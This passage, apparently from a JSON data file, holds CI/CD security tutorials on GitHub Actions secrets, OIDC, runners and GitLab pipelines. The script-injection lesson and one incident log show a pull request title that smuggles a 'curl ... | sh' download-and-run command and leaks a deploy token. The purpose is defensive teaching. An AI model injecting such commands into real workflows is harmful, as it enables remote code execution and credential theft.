cloud keys\u003c/li>\n\u003cli>Pinning third-party actions and limiting token scope\u003c/li>\n\u003cli>Avoiding script injection from untrusted input\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"secrets\">Secrets\u003c/h2>\n\u003cp>Secrets can be set at repository, environment or organization level. Prefer \u003cstrong>environment secrets\u003c/strong> for production, with required reviewers so a person approves before a job gets them. Secrets are masked in logs, but masking is not protection: a script can transform a secret and print it. Never echo secrets, and give each job only the ones it needs.\u003c/p>\n\u003ch2 id=\"oidc-instead-of-stored-keys\">OIDC instead of stored keys\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"permissions:\n  id-token: write\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy\n          aws-region: eu-west-1\n      - run: aws sts get-caller-identity\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">permissions:\u003c/span>\n  \u003cspan class=\"hljs-attr\">id-token:\u003c/span> \u003cspan class=\"hljs-string\">write\u003c/span>\n  \u003cspan class=\"hljs-attr\">contents:\u003c/span> \u003cspan class=\"hljs-string\">read\u003c/span>\n\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">deploy:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">aws-actions/configure-aws-credentials@v4\u003c/span>\n        \u003cspan class=\"hljs-attr\">with:\u003c/span>\n          \u003cspan class=\"hljs-attr\">role-to-assume:\u003c/span> \u003cspan class=\"hljs-string\">arn:aws:iam::123456789012:role/ci-deploy\u003c/span>\n          \u003cspan class=\"hljs-attr\">aws-region:\u003c/span> \u003cspan class=\"hljs-string\">eu-west-1\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">aws\u003c/span> \u003cspan class=\"hljs-string\">sts\u003c/span> \u003cspan class=\"hljs-string\">get-caller-identity\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>With \u003cstrong>OpenID Connect\u003c/strong>, the workflow requests a short-lived signed token and the cloud provider exchanges it for temporary credentials. The cloud role&#39;s trust policy limits which repository, branch or environment may assume it. No long-lived access key is stored in the repository, so there is nothing to leak or rotate.\u003c/p>\n\u003ch2 id=\"pin-and-restrict\">Pin and restrict\u003c/h2>\n\u003cp>Third-party actions run with your job&#39;s access. Pin them to a full commit SHA, review updates, and let automated dependency updates propose new versions. Set \u003ccode>permissions:\u003c/code> to the minimum and require approval for workflows from first-time outside contributors.\u003c/p>\n\u003ch2 id=\"script-injection\">Script injection\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# Unsafe: the title becomes part of the shell script\n- run: echo &quot;${{ github.event.pull_request.title }}&quot;\n\n# Safer: pass it as data through an environment variable\n- run: echo &quot;$TITLE&quot;\n  env:\n    TITLE: ${{ github.event.pull_request.title }}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># Unsafe: the title becomes part of the shell script\u003c/span>\n\u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;$\u003cspan class=\"hljs-template-variable\">{{ github.event.pull_request.title }}\u003c/span>&quot;\u003c/span>\n\n\u003cspan class=\"hljs-comment\"># Safer: pass it as data through an environment variable\u003c/span>\n\u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;$TITLE&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">env:\u003c/span>\n    \u003cspan class=\"hljs-attr\">TITLE:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">github.event.pull_request.title\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Expressions in \u003ccode>${{ }}\u003c/code> are substituted into the script \u003cstrong>before\u003c/strong> the shell runs. A title such as \u003ccode>&quot;; curl evil.sh | sh #\u003c/code> becomes code. Treat titles, branch names, issue text and commit messages as untrusted and pass them through environment variables.\u003c/p>\n\u003ch2 id=\"incident-a-pull-request-title-ran-a-command\">Incident: A pull request title ran a command\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A crafted pull request title executed shell code inside a workflow.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Run echo &quot;Fix typo&quot;; curl http://x.example/s | sh #&quot;\u003c/span>\u003cspan class=\"ln out\">% Total  % Received\u003c/span>\u003cspan class=\"ln out\">secret DEPLOY_TOKEN exposed to external host\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The workflow echoed the title with an inline expression. The attacker&#39;s title closed the string and ran a download. The fix was to pass the title through an environment variable, move deployment secrets to a protected environment, rotate the token and add a review rule for workflows triggered by outside contributors.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Interpolating untrusted text into shell lines\u003c/li>\n\u003cli>Storing long-lived cloud keys when OIDC is available\u003c/li>\n\u003cli>Using third-party actions by tag only\u003c/li>\n\u003cli>Granting write permissions by default\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"secrets","text":"Secrets"},{"id":"oidc-instead-of-stored-keys","text":"OIDC instead of stored keys"},{"id":"pin-and-restrict","text":"Pin and restrict"},{"id":"script-injection","text":"Script injection"},{"id":"incident-a-pull-request-title-ran-a-command","text":"Incident: A pull request title ran a command"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Security hardening for GitHub Actions","u":"https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"},{"t":"OpenID Connect in cloud providers","u":"https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect"}],"text":"A workflow is code that runs with credentials, so it deserves the same care as production access. The main risks are leaked secrets, malicious third-party actions and untrusted input reaching a shell, and each has a clear defense. What you will learn Storing secrets at the right scope and keeping them out of logs Using OIDC instead of long-lived cloud keys Pinning third-party actions and limiting token scope Avoiding script injection from untrusted input Secrets Secrets can be set at repository, environment or organization level. Prefer environment secrets for production, with required reviewers so a person approves before a job gets them. Secrets are masked in logs, but masking is not protection: a script can transform a secret and print it. Never echo secrets, and give each job only the ones it needs. OIDC instead of stored keys permissions: id-token: write contents: read jobs: deploy: runs-on: ubuntu-latest steps: - uses: aws-actions/configure-aws-credentials@v4 with: role-to-assume: arn:aws:iam::123456789012:role/ci-deploy aws-region: eu-west-1 - run: aws sts get-caller-identity With OpenID Connect , the workflow requests a short-lived signed token and the cloud provider exchanges it for temporary credentials. The cloud role&#39;s trust policy limits which repository, branch or environment may assume it. No long-lived access key is stored in the repository, so there is nothing to leak or rotate. Pin and restrict Third-party actions run with your job&#39;s access. Pin them to a full commit SHA, review updates, and let automated dependency updates propose new versions. Set permissions: to the minimum and require approval for workflows from first-time outside contributors. Script injection # Unsafe: the title becomes part of the shell script - run: echo \"$ {{ github.event.pull_request.title }} \" # Safer: pass it as data through an environment variable - run: echo \"$TITLE\" env: TITLE: ${{ github.event.pull_request.title }} Expressions in ${{ }} are substituted into the script before the shell runs. A title such as \"; curl evil.sh | sh # becomes code. Treat titles, branch names, issue text and commit messages as untrusted and pass them through environment variables. Incident: A pull request title ran a command Incident A crafted pull request title executed shell code inside a workflow. Run echo \"Fix typo\"; curl http://x.example/s | sh #\" % Total % Received secret DEPLOY_TOKEN exposed to external host The workflow echoed the title with an inline expression. The attacker&#39;s title closed the string and ran a download. The fix was to pass the title through an environment variable, move deployment secrets to a protected environment, rotate the token and add a review rule for workflows triggered by outside contributors. Common mistakes Interpolating untrusted text into shell lines Storing long-lived cloud keys when OIDC is available Using third-party actions by tag only Granting write permissions by default"},"cicd/actions-runners-environments-and-deployments":{"html":"\u003cp>Two decisions shape most Actions setups: where jobs run and how deployments are protected. Hosted runners are easy but limited, self-hosted runners are powerful but risky, and environments add the human and technical gates that production deserves.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Hosted versus self-hosted runners and when to choose each\u003c/li>\n\u003cli>Why ephemeral runners are safer\u003c/li>\n\u003cli>Environments, reviewers and scoped secrets\u003c/li>\n\u003cli>Deploy jobs with concurrency and rollback thinking\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"choosing-runners\">Choosing runners\u003c/h2>\n\u003cp>Hosted runners are fresh virtual machines that the platform patches and discards, with fixed sizes and per-minute billing. Choose \u003cstrong>self-hosted\u003c/strong> runners when jobs need private network access, special hardware such as GPUs, large caches or lower unit cost at scale. Select them with labels:\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"jobs:\n  build:\n    runs-on: [self-hosted, linux, x64, gpu]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">build:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> [\u003cspan class=\"hljs-string\">self-hosted\u003c/span>, \u003cspan class=\"hljs-string\">linux\u003c/span>, \u003cspan class=\"hljs-string\">x64\u003c/span>, \u003cspan class=\"hljs-string\">gpu\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"make-self-hosted-runners-ephemeral\">Make self-hosted runners ephemeral\u003c/h2>\n\u003cp>A long-lived runner keeps files, caches and credentials from earlier jobs. The safer pattern is an \u003cstrong>ephemeral\u003c/strong> runner that registers, runs one job and is destroyed, usually launched on demand by an autoscaler such as a Kubernetes controller. Never attach self-hosted runners to public repositories, because a pull request from a stranger could run code inside your network.\u003c/p>\n\u003ch2 id=\"environments\">Environments\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment:\n      name: production\n      url: https://shop.example.com\n    concurrency:\n      group: deploy-production\n      cancel-in-progress: false\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./deploy.sh\n        env:\n          TOKEN: ${{ secrets.PROD_TOKEN }}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">deploy:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">environment:\u003c/span>\n      \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">production\u003c/span>\n      \u003cspan class=\"hljs-attr\">url:\u003c/span> \u003cspan class=\"hljs-string\">https://shop.example.com\u003c/span>\n    \u003cspan class=\"hljs-attr\">concurrency:\u003c/span>\n      \u003cspan class=\"hljs-attr\">group:\u003c/span> \u003cspan class=\"hljs-string\">deploy-production\u003c/span>\n      \u003cspan class=\"hljs-attr\">cancel-in-progress:\u003c/span> \u003cspan class=\"hljs-literal\">false\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span>\n        \u003cspan class=\"hljs-attr\">env:\u003c/span>\n          \u003cspan class=\"hljs-attr\">TOKEN:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">secrets.PROD_TOKEN\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>An \u003cstrong>environment\u003c/strong> can require reviewers, add a wait timer, limit which branches may deploy and hold its own secrets. The job pauses until a reviewer approves, and the deployment is recorded with its URL. The concurrency group queues deployments one at a time.\u003c/p>\n\u003ch2 id=\"deployment-habits\">Deployment habits\u003c/h2>\n\u003cp>Deploy the artifact you tested, by digest or version, not a fresh rebuild. Run a smoke test after deploy and make rollback a normal path: redeploy the previous version through the same workflow. Record who approved and what shipped.\u003c/p>\n\u003ch2 id=\"incident-the-runner-that-remembered\">Incident: The runner that remembered\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A leftover credential on a long-lived runner was used by a later job.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Run ls ~/.aws\u003c/span>\u003cspan class=\"ln out\">credentials  config\u003c/span>\u003cspan class=\"ln out\">job 7731 used role from job 7702\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The team ran a handful of permanent self-hosted runners. An earlier job wrote credentials to the home directory and never cleaned up. A different repository&#39;s job later found and used them. The team moved to ephemeral runners created per job, one runner group per trust level and OIDC so no key was written to disk.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Long-lived self-hosted runners shared across trust levels\u003c/li>\n\u003cli>Self-hosted runners on public repositories\u003c/li>\n\u003cli>Production deploys with no approval or branch restriction\u003c/li>\n\u003cli>Rebuilding for deploy instead of promoting the tested artifact\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"choosing-runners","text":"Choosing runners"},{"id":"make-self-hosted-runners-ephemeral","text":"Make self-hosted runners ephemeral"},{"id":"environments","text":"Environments"},{"id":"deployment-habits","text":"Deployment habits"},{"id":"incident-the-runner-that-remembered","text":"Incident: The runner that remembered"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"About runners","u":"https://docs.github.com/en/actions/concepts/runners"},{"t":"Managing environments for deployment","u":"https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment"}],"text":"Two decisions shape most Actions setups: where jobs run and how deployments are protected. Hosted runners are easy but limited, self-hosted runners are powerful but risky, and environments add the human and technical gates that production deserves. What you will learn Hosted versus self-hosted runners and when to choose each Why ephemeral runners are safer Environments, reviewers and scoped secrets Deploy jobs with concurrency and rollback thinking Choosing runners Hosted runners are fresh virtual machines that the platform patches and discards, with fixed sizes and per-minute billing. Choose self-hosted runners when jobs need private network access, special hardware such as GPUs, large caches or lower unit cost at scale. Select them with labels: jobs: build: runs-on: [ self-hosted , linux , x64 , gpu ] Make self-hosted runners ephemeral A long-lived runner keeps files, caches and credentials from earlier jobs. The safer pattern is an ephemeral runner that registers, runs one job and is destroyed, usually launched on demand by an autoscaler such as a Kubernetes controller. Never attach self-hosted runners to public repositories, because a pull request from a stranger could run code inside your network. Environments jobs: deploy: runs-on: ubuntu-latest environment: name: production url: https://shop.example.com concurrency: group: deploy-production cancel-in-progress: false steps: - uses: actions/checkout@v4 - run: ./deploy.sh env: TOKEN: ${{ secrets.PROD_TOKEN }} An environment can require reviewers, add a wait timer, limit which branches may deploy and hold its own secrets. The job pauses until a reviewer approves, and the deployment is recorded with its URL. The concurrency group queues deployments one at a time. Deployment habits Deploy the artifact you tested, by digest or version, not a fresh rebuild. Run a smoke test after deploy and make rollback a normal path: redeploy the previous version through the same workflow. Record who approved and what shipped. Incident: The runner that remembered Incident A leftover credential on a long-lived runner was used by a later job. Run ls ~/.aws credentials config job 7731 used role from job 7702 The team ran a handful of permanent self-hosted runners. An earlier job wrote credentials to the home directory and never cleaned up. A different repository&#39;s job later found and used them. The team moved to ephemeral runners created per job, one runner group per trust level and OIDC so no key was written to disk. Common mistakes Long-lived self-hosted runners shared across trust levels Self-hosted runners on public repositories Production deploys with no approval or branch restriction Rebuilding for deploy instead of promoting the tested artifact"},"cicd/gitlab-ci-pipelines-stages-and-jobs":{"html":"\u003cp>GitLab CI is part of the GitLab product and is configured by one YAML file at the root of the repository. Learn the vocabulary of stages, jobs, scripts and images, and you can read almost any GitLab pipeline.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The structure of .gitlab-ci.yml\u003c/li>\n\u003cli>How stages and jobs run\u003c/li>\n\u003cli>Choosing images and writing scripts\u003c/li>\n\u003cli>Using variables and predefined variables\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-file\">The file\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"stages: [build, test, deploy]\n\ndefault:\n  image: node:20-alpine\n\nvariables:\n  NODE_ENV: test\n\nbuild:\n  stage: build\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths: [dist/]\n    expire_in: 1 day\n\nunit:\n  stage: test\n  script:\n    - npm test\n\nlint:\n  stage: test\n  script:\n    - npm run lint\n\ndeploy:\n  stage: deploy\n  script:\n    - ./deploy.sh &quot;$CI_COMMIT_SHORT_SHA&quot;\n  environment: production\n  when: manual\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">stages:\u003c/span> [\u003cspan class=\"hljs-string\">build\u003c/span>, \u003cspan class=\"hljs-string\">test\u003c/span>, \u003cspan class=\"hljs-string\">deploy\u003c/span>]\n\n\u003cspan class=\"hljs-attr\">default:\u003c/span>\n  \u003cspan class=\"hljs-attr\">image:\u003c/span> \u003cspan class=\"hljs-string\">node:20-alpine\u003c/span>\n\n\u003cspan class=\"hljs-attr\">variables:\u003c/span>\n  \u003cspan class=\"hljs-attr\">NODE_ENV:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n\n\u003cspan class=\"hljs-attr\">build:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">ci\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">run\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n  \u003cspan class=\"hljs-attr\">artifacts:\u003c/span>\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span> [\u003cspan class=\"hljs-string\">dist/\u003c/span>]\n    \u003cspan class=\"hljs-attr\">expire_in:\u003c/span> \u003cspan class=\"hljs-number\">1\u003c/span> \u003cspan class=\"hljs-string\">day\u003c/span>\n\n\u003cspan class=\"hljs-attr\">unit:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n\n\u003cspan class=\"hljs-attr\">lint:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">run\u003c/span> \u003cspan class=\"hljs-string\">lint\u003c/span>\n\n\u003cspan class=\"hljs-attr\">deploy:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">deploy\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span> \u003cspan class=\"hljs-string\">&quot;$CI_COMMIT_SHORT_SHA&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">environment:\u003c/span> \u003cspan class=\"hljs-string\">production\u003c/span>\n  \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">manual\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003cstrong>Stages\u003c/strong> run in order and jobs inside a stage run in parallel. A job runs in the container named by \u003ccode>image\u003c/code>, and \u003ccode>script\u003c/code> is the list of commands. \u003ccode>before_script\u003c/code> and \u003ccode>after_script\u003c/code> wrap it. Here \u003ccode>unit\u003c/code> and \u003ccode>lint\u003c/code> run at the same time after \u003ccode>build\u003c/code> finishes.\u003c/p>\n\u003ch2 id=\"variables\">Variables\u003c/h2>\n\u003cp>GitLab provides predefined variables such as \u003ccode>CI_COMMIT_SHA\u003c/code>, \u003ccode>CI_COMMIT_BRANCH\u003c/code> and \u003ccode>CI_PIPELINE_ID\u003c/code>. You set your own in \u003ccode>variables:\u003c/code> at file or job level, or in project settings where they can be \u003cstrong>masked\u003c/strong> and \u003cstrong>protected\u003c/strong>. A job-level value overrides a file-level one.\u003c/p>\n\u003ch2 id=\"faster-pipelines-with-needs\">Faster pipelines with needs\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"unit:\n  stage: test\n  needs: [build]\n  script: [npm test]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">unit:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\n  \u003cspan class=\"hljs-attr\">needs:\u003c/span> [\u003cspan class=\"hljs-string\">build\u003c/span>]\n  \u003cspan class=\"hljs-attr\">script:\u003c/span> [\u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>With \u003ccode>needs\u003c/code>, a job starts as soon as the jobs it names finish, even if the rest of its stage is still running. This turns the stage list into a graph and often shortens pipelines a lot.\u003c/p>\n\u003ch2 id=\"reading-a-pipeline\">Reading a pipeline\u003c/h2>\n\u003cp>The pipeline page shows jobs as boxes by stage. Open a job to see the log, the image and the runner that ran it. Use \u003ccode>CI Lint\u003c/code> in the editor to check syntax before pushing, and retry only the failed job instead of the whole pipeline.\u003c/p>\n\u003ch2 id=\"incident-the-stage-that-waited-for-nothing\">Incident: The stage that waited for nothing\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A pipeline took 40 minutes because every stage waited for the one before it.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Pipeline #5521 duration: 40m12s\u003c/span>\u003cspan class=\"ln out\">build 6m  test 21m  package 4m (waited 21m)\u003c/span>\u003cspan class=\"ln out\">package depended only on build\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The package job needed only build output but sat in a later stage and waited for the slow tests. Adding needs: [build] let it start immediately, and the pipeline dropped to 28 minutes. The team also moved quick lint to the first stage so developers saw feedback within two minutes.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Putting slow jobs first so feedback is late\u003c/li>\n\u003cli>Not using needs, so jobs wait unnecessarily\u003c/li>\n\u003cli>Hard-coding values instead of variables\u003c/li>\n\u003cli>Storing secrets in the YAML file\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"the-file","text":"The file"},{"id":"variables","text":"Variables"},{"id":"faster-pipelines-with-needs","text":"Faster pipelines with needs"},{"id":"reading-a-pipeline","text":"Reading a pipeline"},{"id":"incident-the-stage-that-waited-for-nothing","text":"Incident: The stage that waited for nothing"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"GitLab CI/CD documentation","u":"https://docs.gitlab.com/ee/ci/"},{"t":"CI/CD YAML syntax reference","u":"https://docs.gitlab.com/ee/ci/yaml/"}],"text":"GitLab CI is part of the GitLab product and is configured by one YAML file at the root of the repository. Learn the vocabulary of stages, jobs, scripts and images, and you can read almost any GitLab pipeline. What you will learn The structure of .gitlab-ci.yml How stages and jobs run Choosing images and writing scripts Using variables and predefined variables The file stages: [ build , test , deploy ] default: image: node:20-alpine variables: NODE_ENV: test build: stage: build script: - npm ci - npm run build artifacts: paths: [ dist/ ] expire_in: 1 day unit: stage: test script: - npm test lint: stage: test script: - npm run lint deploy: stage: deploy script: - ./deploy.sh \"$CI_COMMIT_SHORT_SHA\" environment: production when: manual Stages run in order and jobs inside a stage run in parallel. A job runs in the container named by image , and script is the list of commands. before_script and after_script wrap it. Here unit and lint run at the same time after build finishes. Variables GitLab provides predefined variables such as CI_COMMIT_SHA , CI_COMMIT_BRANCH and CI_PIPELINE_ID . You set your own in variables: at file or job level, or in project settings where they can be masked and protected . A job-level value overrides a file-level one. Faster pipelines with needs unit: stage: test needs: [ build ] script: [ npm test ] With needs , a job starts as soon as the jobs it names finish, even if the rest of its stage is still running. This turns the stage list into a graph and often shortens pipelines a lot. Reading a pipeline The pipeline page shows jobs as boxes by stage. Open a job to see the log, the image and the runner that ran it. Use CI Lint in the editor to check syntax before pushing, and retry only the failed job instead of the whole pipeline. Incident: The stage that waited for nothing Incident A pipeline took 40 minutes because every stage waited for the one before it. Pipeline #5521 duration: 40m12s build 6m test 21m package 4m (waited 21m) package depended only on build The package job needed only build output but sat in a later stage and waited for the slow tests. Adding needs: [build] let it start immediately, and the pipeline dropped to 28 minutes. The team also moved quick lint to the first stage so developers saw feedback within two minutes. Common mistakes Putting slow jobs first so feedback is late Not using needs, so jobs wait unnecessarily Hard-coding values instead of variables Storing secrets in the YAML file"},"cicd/gitlab-ci-rules-artifacts-and-caches":{"html":"\u003cp>Real pipelines do different things for merge requests, the default branch and tags. GitLab expresses that with rules, and it gives you two tools for keeping files, artifacts and caches, which look similar but have very different guarantees.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Writing rules with if, changes and exists\u003c/li>\n\u003cli>Preventing duplicate pipelines with workflow rules\u003c/li>\n\u003cli>When to use artifacts and when caches\u003c/li>\n\u003cli>Cache keys, policies and expiry\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"rules\">Rules\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"workflow:\n  rules:\n    - if: $CI_PIPELINE_SOURCE == &quot;merge_request_event&quot;\n    - if: $CI_COMMIT_BRANCH &amp;&amp; $CI_OPEN_MERGE_REQUESTS\n      when: never\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n    - if: $CI_COMMIT_TAG\n\ndocs:\n  script: make docs\n  rules:\n    - changes: [docs/**/*]\n\nrelease:\n  script: ./release.sh\n  rules:\n    - if: $CI_COMMIT_TAG\n      when: on_success\n    - when: never\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">workflow:\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_PIPELINE_SOURCE\u003c/span> \u003cspan class=\"hljs-string\">==\u003c/span> \u003cspan class=\"hljs-string\">&quot;merge_request_event&quot;\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_COMMIT_BRANCH\u003c/span> \u003cspan class=\"hljs-string\">&amp;&amp;\u003c/span> \u003cspan class=\"hljs-string\">$CI_OPEN_MERGE_REQUESTS\u003c/span>\n      \u003cspan class=\"hljs-attr\">when:\u003c/span> \u003cspan class=\"hljs-string\">never\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">$CI_COMMIT_BRANCH\u003c/span> \u003cspan class=\"hljs-string\">==\u003c/span> \u003cspan 